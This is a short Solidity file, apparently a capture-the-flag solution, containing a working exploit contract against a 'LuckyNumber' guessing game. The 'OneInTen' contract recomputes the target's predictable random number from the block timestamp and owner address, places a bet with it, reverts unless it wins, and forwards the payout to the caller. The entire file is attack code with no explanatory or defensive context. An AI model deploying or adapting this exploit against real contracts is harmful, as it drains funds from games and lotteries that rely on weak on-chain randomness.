1 pragma solidity ^0.4.20;
2 
3 contract LuckyNumber {
4   function takeAGuess(uint8 _myGuess) public payable {}
5 }
6 
7 contract OneInTen {
8   function call_lucky(address contract_address, address contract_owner) public payable {
9     uint8 guess = uint8(keccak256(now, contract_owner)) % 10;
10     LuckyNumber(contract_address).takeAGuess.value(msg.value)(guess);
11     require(this.balance > 0);
12     msg.sender.transfer(this.balance);
13   }
14   
15   function() payable external {
16   }
17 }